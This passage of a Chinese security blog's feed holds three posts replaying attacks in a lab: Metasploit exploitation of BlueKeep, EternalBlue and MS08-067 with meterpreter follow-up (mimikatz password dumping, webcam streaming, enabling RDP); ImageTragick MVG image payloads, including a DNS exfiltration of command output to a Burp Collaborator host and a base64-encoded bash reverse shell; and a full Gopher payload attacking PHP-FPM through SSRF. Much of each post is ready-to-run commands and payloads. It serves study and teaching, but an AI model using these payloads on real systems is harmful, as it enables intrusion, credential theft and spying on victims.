href="https://saucer-man.com/information_security/103.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/103.html</a></p><p><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近看了一些xss利用方式，发现本人在以前对编码绕过这一个点的原理好像没有太本质性的理解，所以就有了这篇文章，对浏览器进行解析的顺序有一个记录，也从中收获到点东西，准备校赛出一个题目关于这个内容
    
    </summary>
    
      <category term="xss" scheme="0verwatch.top/categories/xss/"/>
    
    
      <category term="xss" scheme="0verwatch.top/tags/xss/"/>
    
      <category term="bypass" scheme="0verwatch.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708，MS17-010，MS08-067漏洞复现</title>
    <link href="0verwatch.top/msf-cve-review.html"/>
    <id>0verwatch.top/msf-cve-review.html</id>
    <published>2019-09-10T15:25:17.000Z</published>
    <updated>2019-09-10T15:34:34.584Z</updated>
    
    <content type="html"><![CDATA[<p>虽然网上都一大堆了，有些自己踩过的还是要记录一下，毕竟有用<a id="more"></a>。</p><h3 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708 (BlueKeep)"></a>CVE-2019-0708 (BlueKeep)</h3><p>远程桌面服务（以前称为终端服务）中存在远程执行代码漏洞，当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。windows2003、windows2008、windows2008 R2、windows xp系统都会遭到攻击。</p><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>由于现阶段的exp只能在win7 sp1版本和win 2008 R2版本起作用，这里选择win7  sp1 ，经本人测试，该exp利用成功率不太高，经常性 no session was created，建议利用一次建议试一次重启靶机一次，提高成功率。</p><p><strong>攻击机</strong>：kali  IP:192.168.70.152（注意metasploit最好更新到5.x以上版本不然可能会出错）<br><strong>靶机</strong>： win7   IP:192.168.70.153（开放3389端口，关闭防火墙）</p><h4 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h4><p>现阶段exp还没有并入msf中，需要自己下载导入一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/</span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>扫一下目标主机确认其开放3389端口</p><p><img src="https://s2.ax1x.com/2019/09/09/ntV61J.png" alt="ntV61J.png"></p><p>进入msf后使用<code>reload_all</code>重新加载0708rdp利用模块，</p><p><img src="https://s2.ax1x.com/2019/09/09/ntn656.png" alt="ntn656.png"></p><p>使用命令<code>search 0708</code> 查找相关模块，第一个和第四个分别是扫描和利用的模块</p><p><img src="https://s2.ax1x.com/2019/09/09/ntu9I0.png" alt="ntu9I0.png"></p><p> 可以先使用第一个模块去扫描靶机是否存在当前漏洞，使用<code>info</code>查询我们需要配置的内容，这里我们需要配置远程ip地址rhosts属性即可，默认3389端口，不需要修改</p><p><img src="https://s2.ax1x.com/2019/09/09/ntuQJK.png" alt="ntuQJK.png"></p><p><code>set rhosts 192.168.70.153</code>之后就可以愉快地run了，可以发现存在该漏洞</p><p><img src="https://s2.ax1x.com/2019/09/09/ntu2oq.png" alt="ntu2oq.png">之后换另外一个利用的模块，<code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>，同样可以先使用info查看需要配置的相关属性，除了跟刚才一样的设置ip的属性，还要注意这个模块存在这样的一个target属性，这是一个坑点，这里规定了靶机的架构，这里我是在虚拟机里面完成的所以选择3，命令就是<code>set target 3</code></p><p><img src="https://s2.ax1x.com/2019/09/09/ntKRnH.png" alt="ntKRnH.png"></p><p>如果直接默认会怎样，可能就会如下图:)，蓝屏警告23333。。</p><p><img src="https://s2.ax1x.com/2019/09/09/ntM4r4.png" alt="ntM4r4.png"></p><p>设置好rhosts为192.168.70.153之后run一发，可以看到权限直接是system权限了，为所欲为了。</p><p><img src="https://s2.ax1x.com/2019/09/09/nN9PsK.png" alt="nN9PsK.png"></p><h3 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17-010(永恒之蓝)"></a>MS17-010(永恒之蓝)</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><h4 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p><strong>攻击机</strong>：kali  IP: 192.168.70.152<br><strong>靶机</strong>： win7   IP: 192.168.70.153（开放445端口，关闭防火墙）</p><h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><p>先使用nmap扫描一波主机的端口存活性，<code>nmap -sS -p 445 192.168.70.153</code></p><p><img src="https://s2.ax1x.com/2019/09/09/nNCDjP.png" alt="nNCDjP.png"></p><p>使用命令<code>msfconsole</code>进入msf，然后<code>search ms17-010</code>查找对应的模块，可以看到里面存在对应的扫描模块以及利用模块</p><p><img src="https://s2.ax1x.com/2019/09/09/nNCbEF.png" alt="nNCbEF.png"></p><p>然后这里我使用第二个模块去探测主机是否存在该漏洞，<code>use auxiliary/scanner/smb/smb_ms17_010</code>，然后使用<code>info</code>命令查看我们所需要配置的一些信息，这里我们需要配置的也是一个rhosts，因为他的required也是yes，是必须的，其他的端口号啥的使用默认的445，必要时候我们也是需要改变端口号的</p><p><img src="https://s2.ax1x.com/2019/09/09/nNPF4H.png" alt="nNPF4H.png"></p><p>然后<code>set rhosts 192.168.70.153</code> 之后执行 <code>run</code>命令，发现疑似存在该漏洞</p><p><img src="https://s2.ax1x.com/2019/09/10/nNPtK0.png" alt="nNPtK0.png"></p><p>然后下面就开始使用攻击模块了，这次除了设置一下lhost，rhost之外，我们还可以设置一下payload属性，使用一些msf自带的一些反弹shell的模块，更多功能XD，详细的话我们可以直接使用<code>show payloads</code>命令去查看</p><p><img src="https://s2.ax1x.com/2019/09/10/nN8Ai9.png" alt="nN8Ai9.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.70.152   <span class="comment">#设定攻击机</span></span><br><span class="line"><span class="built_in">set</span> rhost 192.168.70.153   <span class="comment">#设定靶机</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run   <span class="comment">#运行</span></span><br></pre></td></tr></table></figure><p>功能成功，可以使用msf中<code>reverse_tcp</code>里面的一些命令了</p><p><img src="https://s2.ax1x.com/2019/09/10/nNGM60.png" alt="nNGM60.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid<span class="comment">#查看当前权限</span></span><br><span class="line">sysinfo<span class="comment">#查看靶机信息</span></span><br><span class="line">shell<span class="comment">#获取shell</span></span><br><span class="line">chcp 65001<span class="comment">#shell中文识别</span></span><br><span class="line">hashdump   <span class="comment">#好像只有管理员才能用</span></span><br><span class="line"><span class="built_in">pwd</span>    <span class="comment">#查看当前目录</span></span><br><span class="line">ps  <span class="comment">#查看进程信息</span></span><br></pre></td></tr></table></figure><p>emmm，有点无脑，也是直接获得system权限的</p><p><img src="https://s2.ax1x.com/2019/09/10/nNGYtJ.png" alt="nNGYtJ.png"></p><p>主要在这个payload模块下还有其他好玩的东西</p><h5 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h5><p>这个好像是只能获取当前登录的用户的用户名密码，不然的话好像加载不出来密码的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz<span class="comment">#载入mimikatz</span></span><br><span class="line">wdigest</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nNGq9s.png" alt="nNGq9s.png"></p><h5 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h5><p>可以开启3389端口并且顺便关掉防火墙2333</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>Linux下连接rdp，先记着，怕忘了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.70.153 -u user -p passw0rd</span><br></pre></td></tr></table></figure><h5 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传/下载文件"></a>上传/下载文件</h5><p>这个一般在有内网的时候比较好用，上传个代理，扫描器啥的，可以进行内网渗透</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download /</span><br><span class="line">upload /file</span><br></pre></td></tr></table></figure><h5 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure><h5 id="开启摄像头"><a href="#开启摄像头" class="headerlink" title="开启摄像头"></a>开启摄像头</h5><p>个人最喜欢这个操作XD，不解释。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_stream</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nNYZzn.png" alt="nNYZzn.png"></p><h3 id="MS-08067"><a href="#MS-08067" class="headerlink" title="MS-08067"></a>MS-08067</h3><p>攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call 远程过程调用）请求，造成了栈缓冲区内存错误，造成可被利用实施远程代码执行。影响范围：Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本</p><h4 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p><strong>攻击机</strong>：kali  IP: 192.168.70.152<br><strong>靶机</strong>： win xp sp2   IP: 192.168.70.155（关闭防火墙）</p><h4 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h4><p>根据漏洞描述就是说也是需要打开445端口的，所以我们先来确认一下445端口是否开启</p><p><img src="https://s2.ax1x.com/2019/09/10/nUma7R.png" alt="nUma7R.png"></p><p>然后<code>msfconsole</code>进入msf，然后<code>search 08-067</code>查找相关模块，use那个模块即可，使用<code>info</code>查看相关的信息</p><p><img src="https://s2.ax1x.com/2019/09/10/nN6rHH.png" alt="nN6rHH.png"></p><p>然后我们就可以设置rhost，payload，lhost</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.70.155</span><br><span class="line"><span class="built_in">set</span> payload  windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.70.152</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nUns5q.png" alt="nUns5q.png"></p><p>这里面的target属性我们设置为5，选择xp sp2的英文版，如果没选对很可能出现下面的情况</p><p><img src="https://s2.ax1x.com/2019/09/10/nUmycD.png" alt="nUmycD.png"></p><p>run之后可以发现同样是system权限又可以为所欲为了XD</p><p><img src="https://s2.ax1x.com/2019/09/10/nUnOMD.png" alt="nUnOMD.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.有些坑点还是需要注意一下，关于set target的问题，最好还是自己手动设置一下吧，不然直接使用默认的target会可能出现各种各样的问题，毕竟这些架构问题不是我这个水平搞得定的，我太菜了:)</p><p>2.msf常用的就那几个命令，熟练就好了，可能还有其他骚操作，以后遇到再学吧，但是听说在内网渗透的时候不太用，流量太大了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然网上都一大堆了，有些自己踩过的还是要记录一下，毕竟有用
    
    </summary>
    
      <category term="metasploit" scheme="0verwatch.top/categories/metasploit/"/>
    
    
      <category term="metasploit" scheme="0verwatch.top/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick命令执行</title>
    <link href="0verwatch.top/ImageMagick.html"/>
    <id>0verwatch.top/ImageMagick.html</id>
    <published>2019-06-27T11:22:28.000Z</published>
    <updated>2019-06-27T11:24:08.823Z</updated>
    
    <content type="html"><![CDATA[<p>最近在研究disable_function的一些绕过技巧，发现了这个组件导致的一些命令执行漏洞，感觉很有趣，于是学习一下，做个记录<a id="more"></a>。</p><p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，这东西命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。由于存在一个委托Delegate的功能，每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的程序对文件进行处理，关键点就在于输入的内容没做过滤，可以导致一个闭合触发命令执行。下面我就用vulhub上面的一个环境去复现一下</p><p>可以看一下p牛的这篇<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">文章</a>，对里面的内容讲的很详细了，怎么触发。然后可以从这个<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347" target="_blank" rel="noopener">文件</a>中能够发现这一行代码，当然这只是其中的一个利用点，还可以利用其他的command去触发，p牛的文章也讲了。</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnHLVI.png" alt="ZnHLVI.png"></p><p>我比较注意的是command定义了他具体带入system()执行的命令为:”wget” -q -O “%o” “https:%M”。</p><p>这里面可以注意到有几个占位符，占位符的意思如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%i  input image filename</span><br><span class="line">%o  output image filename</span><br><span class="line">%u  unique temporary filename</span><br><span class="line">%Z  unique temporary filename</span><br><span class="line">%#  input image signature</span><br><span class="line">%b  image file size</span><br><span class="line">%c  input image comment</span><br><span class="line">%g  image geometry</span><br><span class="line">%h  image rows (height)</span><br><span class="line">%k  input image number colors</span><br><span class="line">%l  image label</span><br><span class="line">%m  input image format</span><br><span class="line">%p  page number</span><br><span class="line">%q  input image depth</span><br><span class="line">%s  scene number</span><br><span class="line">%w  image columns (width)</span><br><span class="line">%x  input image x resolution</span><br><span class="line">%y  input image y resolution</span><br></pre></td></tr></table></figure><p>%m被定义为输入的图片格式，就是我们输入的url地址。对于此处可以做一个字符串的闭合拼接导致一个可控的逸出点。</p><p>当输入的是这样的是这样一个例子的时候，<code>https://www.a.com&quot;|ls &quot;-la</code>，拼接到上面的字符串就是”wget” -q -O “%o” “https:<a href="http://www.a.com&quot;|ls" target="_blank" rel="noopener">www.a.com&quot;|ls</a> “-la” ，相当于我们可以执行ls -la的命令</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnOSxO.png" alt="ZnOSxO.png"></p><h3 id="构造图片利用"><a href="#构造图片利用" class="headerlink" title="构造图片利用"></a>构造图片利用</h3><p>ImageMagick支持通过.svg、.mvg(ImageMagick自定义的一种类似svg的格式)，这种类型的文件来进行图形绘制，并允许在其中加载其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中，ImageMagick会自动根据其内容进行处理，也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式，这就增加了很多利用场景。</p><p>生成一个文件内容如下，在url括号内进行闭合，并且注入你自己需要的命令，多条命令用逗号分割即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://a.com/image.jpg&quot;|id; &quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/27/ZnjpHH.png" alt="ZnjpHH.png"></p><p>当然，在p牛的博客中也提出了基于这个漏洞原理的好几个CVE的利用方式，可以去尝试一下，这里我截取了我自己实现文件删除效果图</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnvyYn.png" alt="ZnvyYn.png"></p><p>当然，p牛的这个环境去提供了一个上传接口触发这个漏洞，我们可以观察他的这个代码是如何去触发这个漏洞的，可以发现它是利用PHP扩展ImageMagick去触发这个问题，而且只需要调用了Imagick类的构造方法，即可触发这个漏洞，所以这就给我们扩大利用思路的一个过程，就是不同语言ImageMagick拓展都很有可能导致这个问题，需要我们自己在实战中去测试一下啦</p><p><img src="https://s2.ax1x.com/2019/06/27/Zup4jx.png" alt="Zup4jx.png"></p><p>这样我们就可以尝试构造一个含有payload的png图片了，但是页面没有回显，我们可以尝试去做一个DNSlog带出一部分数据，构造的payload如下，然后上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg&quot;|curl &quot;`whoami`.5bhnpoiffg2hswzgylt6a5jjmas1gq.burpcollaborator.net)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>bp接收到的信息如下，可以发现成功带出数据</p><p><img src="https://s2.ax1x.com/2019/06/27/ZumzMF.png" alt="ZumzMF.png"></p><p>当然也可以实现一个反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://a.com/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNzAuMTUwLzIzMzMgMD4mMQ== | base64 -d | bash`&quot;|| &quot; )&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/27/Zuu7hq.png" alt="Zuu7hq.png"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>漏洞影响ImageMagick 6.9.3-9以前是所有版本，思路主要是构造图片，里面的payload需要设置好，让ImageMagick组件对其进行底层system函数的触发。</li><li>防御的方式，其一是通过升级到高版本组件，其二是通过配置policy.xml的方式来禁止https、mvg这些delegate，或者直接在配置文件删除相应的delegate。</li></ol><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><p><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在研究disable_function的一些绕过技巧，发现了这个组件导致的一些命令执行漏洞，感觉很有趣，于是学习一下，做个记录
    
    </summary>
    
      <category term="命令执行" scheme="0verwatch.top/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="命令执行" scheme="0verwatch.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Gopher攻击FastCGI的小结</title>
    <link href="0verwatch.top/Gopher-fastcgi.html"/>
    <id>0verwatch.top/Gopher-fastcgi.html</id>
    <published>2019-06-23T09:28:46.000Z</published>
    <updated>2019-06-23T09:33:03.253Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇文章是上一篇文章的一些扩展内容，虽然这个环境极其苛刻，但是学到一些新的知识就好。</p><p>这篇文章大多数内容是来自p神博文的，我只是做个总结顺便做个复现，Orz。<a id="more"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">传送门</a></p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><h3 id="PHP-FPM（FastCGI进程管理器）"><a href="#PHP-FPM（FastCGI进程管理器）" class="headerlink" title="PHP-FPM（FastCGI进程管理器）"></a>PHP-FPM（FastCGI进程管理器）</h3><p>为什么使用nginx进行搭建php环境的时候会出现php-fpm？FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。然后再通过FPM去将数据交给对应的PHP文件。</p><p>这篇文章的关键问题就出在这个fpm接收的数据上，只要我们我们构造满足协议规范的请求包去访问该进程监听的端口，就可以导致任意代码的执行，但我们在协议中需要打开设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code></p><h3 id="利用的条件"><a href="#利用的条件" class="headerlink" title="利用的条件"></a>利用的条件</h3><ul><li>libcurl版本&gt;=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断)</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这里我使用的是 vulhunb上的的 fpm 环境，默认是监听的9000端口</p><p><img src="https://s2.ax1x.com/2019/06/23/ZPwJoR.png" alt="ZPwJoR.png"></p><p>但是我们还需要服务器上的一个php文件的绝对路径，现在复现我们可以使用<code>find / -name &quot;*.php&quot;</code>去找，实际情况中的话就得爆破去找了23333</p><p>使用p神的<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">脚本</a>测试一下这个开放的9000端口，是可以成功实现的，所以说直接向外网暴露出这个服务真的很危险。</p><p><img src="https://s2.ax1x.com/2019/06/23/ZP6Qhj.png" alt="ZP6Qhj.png"></p><p>但是既然本篇文章是上一篇文章的扩展，就需要从ssrf的角度去对其进行利用，因此先是本地抓取一波流量，这里使用nc的方式去获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 -p 2333 -c <span class="string">"&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;"</span> /usr/<span class="built_in">local</span>/lib/php/PEAR.php</span><br></pre></td></tr></table></figure><p>nc监听并获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333 &gt;  1.txt</span><br></pre></td></tr></table></figure><p>然后对其内容进行url编码，获得exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line"></span><br><span class="line">ff = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> quote(ff)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/23/ZPWG0P.png" alt="ZPWG0P.png"></p><p>构造gopher协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01xt%00%08%00%00%00%01%00%00%00%00%00%00%01%04xt%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04xt%00%00%00%00%01%05xt%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05xt%00%00%00%00</span><br></pre></td></tr></table></figure><p>这里使用curl去模拟，观察tmp目录下确实写入文件</p><p><img src="https://s2.ax1x.com/2019/06/23/ZPfk9g.png" alt="ZPfk9g.png"></p><p>只要在ssrf下探测到有fpm接口的话，我们就可以利用获得代码执行的权限啦。</p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html" target="_blank" rel="noopener">https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一篇文章是上一篇文章的一些扩展内容，虽然这个环境极其苛刻，但是学到一些新的知识就好。&lt;/p&gt;
&lt;p&gt;这篇文章大多数内容是来自p神博文的，我只是做个总结顺便做个复现，Orz。
    
    </summary>
    
      <category term="FastCGI" scheme="0verwatch.top/categories/FastCGI/"/>
    
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="FastCGI" scheme="0verwatch.top/tags/FastCGI/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问漏洞一些利用</title>
    <link href="0verwatch.top/redis-vul.html"/>
    <id>0verwatch.top/redis-vul.html</id>
    <published>2019-06-16T08:37:20.000Z</published>
    <updated>2019-06-16T08:39:32.965Z</updated>
    
